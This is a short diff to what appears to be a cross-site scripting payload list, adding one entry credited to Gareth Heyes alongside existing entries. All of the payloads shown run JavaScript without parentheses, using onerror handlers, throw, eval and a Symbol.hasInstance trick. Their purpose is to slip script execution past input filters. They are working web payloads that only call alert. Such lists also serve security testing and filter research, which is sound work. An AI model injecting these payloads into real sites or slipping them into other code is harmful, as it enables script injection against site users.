@@ -30,6 +30,11 @@ xss.html
     onerror=alert;throw 23;
 
 ---
+[Garethheyes](https://twitter.com/garethheyes/status/1128974215682637825)
+
+    'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}
+
+---
 Only Chrome [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)
 
     onerror=eval;throw'=alert\x2823\x29';
